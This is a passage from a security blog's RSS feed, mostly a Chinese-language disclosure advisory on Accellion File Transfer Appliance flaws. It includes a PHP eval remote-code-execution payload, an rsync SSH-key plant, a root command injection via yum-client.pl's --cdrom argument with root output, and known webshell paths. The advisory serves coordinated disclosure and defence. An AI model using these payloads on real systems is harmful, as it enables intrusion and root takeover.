        &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;echo(&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;(&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;quot;, &amp;quot;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;quot;));&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;如果已知加密 KEY 的話，即可控制 &lt;code class=&quot;highlighter-rouge&quot;&gt;decrypt( $_POST[fc] )&lt;/code&gt; 的輸出，而後面的正規表示式雖然針對函數名稱進行白名單過濾，但是沒對參數進行過濾，如此一來我們可以在參數的部分插入任意代碼，唯一的條件就是不能有 &lt;code class=&quot;highlighter-rouge&quot;&gt;(&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;)&lt;/code&gt; 出現，但由於 PHP 的鬆散特性，玩法其實很多，這裡列舉兩個：&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
直接透過反引號執行系統指令：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(`$_POST[cmd]`);&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
更優雅的方式可以透過 include 語法引入上傳檔案的 tmp_name，這樣各種保護都不用擔心：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(include $_FILES[file][tmp_name]);&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;local-privilege-escalation-cve-2016-2352-and-cve-2016-2353&quot;&gt;Local Privilege Escalation (CVE-2016-2352 and CVE-2016-2353)&lt;/h4&gt;
&lt;p&gt;在取得 PHP 網頁權限後，發現所屬權限為 nobody，為了進行更深入的研究，在對環境進行審視後，發現兩個可用來提升權限之弱點。&lt;/p&gt;

&lt;h5 id=&quot;1-rsync-配置錯誤&quot;&gt;1. Rsync 配置錯誤&lt;/h5&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/opt/rsyncd.conf&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-lighttpd&quot; data-lang=&quot;lighttpd&quot;&gt;&lt;span class=&quot;k&quot;&gt;log&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;/home/soggycat/log/kennel.log&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;soggycat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;/home/soggycat&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;soggycat&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;only&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;其中模組名稱 soggycat 對 &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/soggycat/&lt;/code&gt; 為任何人可讀可寫，所以可將 SSH Key 寫至 /home/soggycat/.ssh/ 後以 soggycat 身分登入&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;id
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/
drwx------        &lt;span class=&quot;m&quot;&gt;4096&lt;/span&gt; 2016/01/29 18:13:41 .
-rw-r--r--         &lt;span class=&quot;m&quot;&gt;606&lt;/span&gt; 2016/01/29 18:13:41 authorized_keys

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/authorized_keys .
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat id_dsa.pub &amp;gt;&amp;gt; authorized_keys
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync authorized_keys 0::soggycat/.ssh/

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh -i id_dsa -o &lt;span class=&quot;nv&quot;&gt;UserKnownHostsFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/null -o &lt;span class=&quot;nv&quot;&gt;StrictHostKeyChecking&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;no soggycat@localhost id
Could not create directory &lt;span class=&quot;s1&quot;&gt;&amp;#39;/.ssh&amp;#39;&lt;/span&gt;.
Warning: Permanently added &lt;span class=&quot;s1&quot;&gt;&amp;#39;0,0.0.0.0&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to the list of known hosts.
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;520&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;soggycat&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;2-command-injection-in-yum-clientpl&quot;&gt;2. Command Injection in “yum-client.pl”&lt;/h5&gt;

&lt;p&gt;在 FTA 中，為了使系統可以直接透過網頁介面進行更新，因此在 sudoers 配置中特別針對 nobody 用戶允許直接使用 root 權限執行指令，並透過 &lt;code class=&quot;highlighter-rouge&quot;&gt;yum-client.pl&lt;/code&gt; 這隻程式進行軟體更新&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/sudoers&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;...
&lt;span class=&quot;nb&quot;&gt;Cmnd_Alias&lt;/span&gt;      YUM_UPGRADE = &lt;span class=&quot;sx&quot;&gt;/usr/bin/yum&lt;/span&gt; -y upgrade
&lt;span class=&quot;nb&quot;&gt;Cmnd_Alias&lt;/span&gt;      YUM_CLIENT = &lt;span class=&quot;sx&quot;&gt;/usr/local/bin/yum-client.pl&lt;/span&gt;
...
&lt;span class=&quot;c&quot;&gt;# User privilege specification&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt;=(ALL) &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;admin&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: UPDATE_DNS, UPDATE_GW, UPDATE_NTP, RESTART_NETWORK, CHMOD_OLDTEMP ...
&lt;span class=&quot;nb&quot;&gt;nobody&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: SSL_SYSTEM, ADMIN_SYSTEM, IPSEC_CMD, YUM_CLIENT
&lt;span class=&quot;nb&quot;&gt;soggycat&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: ADMIN_SYSTEM, IPSEC_CMD, CHOWN_IPSEC, UPDATE_IPSEC, YUM_CLIENT
&lt;span class=&quot;nb&quot;&gt;radmin&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: RESET_APPL
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;其中 YUM_CLIENT 就是進行更新的指令，部分代碼如下：&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/usr/local/bin/yum-client.pl&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;GetOptions&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;help&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;download_only&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$download_only&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;list&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;cache&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;clearcache&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$clearcache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;cdrom=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;appid=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$appid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;servername=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$servername&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;version=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;token=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/usr/bin/yum&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;$YUM_CMD -C&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# if this is based on RHEL 5, change the repository&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`grep -q 5 /etc/redhat-release &amp;amp;&amp;amp; echo -n 5`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/home/seos/log/yum-client.log&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$STATUSFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/home/seos/log/yum-client.status&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMCONFIG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/etc/yum.conf&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMDIFF_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;/home/seos/log/yum.diff&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;eq&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;5&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;$YUM_CMD -c $cdrom_path/yum.conf-5&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;$YUM_CMD -c $cdrom_path/yum.conf&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;mkdir -p /mnt/cdrom &amp;amp;&amp;amp; mount -o loop $cdrom $cdrom_path&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fdielog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;unable to mount: $!&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;深入觀察 &lt;code class=&quot;highlighter-rouge&quot;&gt;yum-client.pl&lt;/code&gt; 後可發現在 &lt;code class=&quot;highlighter-rouge&quot;&gt;--cdrom&lt;/code&gt; 參數上存在 Command Injection，使得攻擊者可將任意指令插入參數內並以 root 身分執行&lt;/p&gt;

&lt;p&gt;所以使用如下指令：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;id
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo /usr/local/bin/yum-client.pl --cdrom&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;$(id &amp;gt; /tmp/.gg)&amp;#39;&lt;/span&gt;
mount: can&lt;span class=&quot;err&quot;&gt;&amp;#39;&lt;/span&gt;t find /mnt/cdrom in /etc/fstab or /etc/mtab
unable to mount: Bad file descriptor at /usr/local/bin/yum-client.pl line 113.


bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat /tmp/.gg
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,6&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;disk&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,10&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;即可以 root 身分執行任意指令！&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;後門&quot;&gt;後門&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
在取得最高權限後，開始對伺服器進行一些審視時，發現已有幾款後門藏在 FTA 主機中了，經過研究後首先確認一款 IRC BOT 為 Niara 所發布的 &lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;弱點報告&lt;/a&gt; 中有提及，此外，額外發現兩款不同類型的 PHP Webshell 並無在公開的報告中發現，透過 Apache Log 時間推測應該是透過 2015 年中的 CVE-2015-2857 所放置之後門。&lt;/p&gt;

&lt;p&gt;PHPSPY 後門，全球 1217 台存活主機上共發現 62 台，放置路徑於：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/Redirector_Cache.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;WSO 後門，全球 1217 台存活主機上共發現 9 台，放置路徑於：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/imag.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;致謝&quot;&gt;致謝&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
這份 Advisory 所提及的弱點為在 2016 二月時參加 Facebook Bug Bounty 時尋找到的，詳情可參考文章《&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;滲透 Facebook 的思路與發現&lt;/a&gt;》，找到弱點的當下立即回報包括 Accellion 及 Facebook，Accellion 並在 2/12 號將此份弱點記錄在 FTA_9_12_40 並通知所有受影響的客戶安裝修補程式。&lt;/p&gt;

&lt;p&gt;感謝 Facebook 以及 Accellion 的迅速反應跟配合 : )&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;timeline&quot;&gt;Timeline&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2016/02/06 05:21 聯絡 Accellion 詢問何處可回報弱點&lt;/li&gt;
  &lt;li&gt;2016/02/07 12:35 將報告寄至 Accellion Support Team&lt;/li&gt;
  &lt;li&gt;2016/03/03 03:03 Accellion Support Team 通知會在 FTA_9_12_40  修復&lt;/li&gt;
  &lt;li&gt;2016/05/10 15:18 詢問將撰寫 Advisory 許可及通知發現兩款後門存在&lt;/li&gt;
  &lt;li&gt;2016/06/06 10:20 雙方討論定稿&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;參考&quot;&gt;參考&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;R7-2015-08: Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt; &lt;a name=&quot;ref1&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/resources/advisories/R7-0039.jsp&quot;&gt;Rapid7 Advisory R7-0039: Accellion File Transfer Appliance Multiple Vulnerabilities&lt;/a&gt; &lt;a name=&quot;ref2&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;Threat Advisory: Accellion File Transfer Appliance Vulnerability&lt;/a&gt; &lt;a name=&quot;ref3&quot;&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/</link>
                <guid>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability</guid>
                <pubDate>Thu, 22 Sep 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>電商業者的資安困境？</title>
                <description>&lt;p&gt;台灣電商網站蓬勃發展，豐富的個資、金流都吸引了攻擊者。近期刑事局 165 反詐騙網站上常看到很多電商網站面臨個資外洩的問題，新聞也不斷報導民眾因為個資外洩被詐騙集團騙取錢財。資安問題是電商業者面臨到最大的危機，民眾也很憤怒為什麼這些企業都不肯把資安做好。但我相信，電商網站的業主也是有苦難言。不少企業知道該把資安做好，有些可能不得其法，也可能什麼都做了，卻還是無法防止自己的網站出現在 165 詐騙排行的榜單上。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;內政部警政署 165 反詐騙諮詢專線 民眾通報高風險賣場排名  &lt;br /&gt;
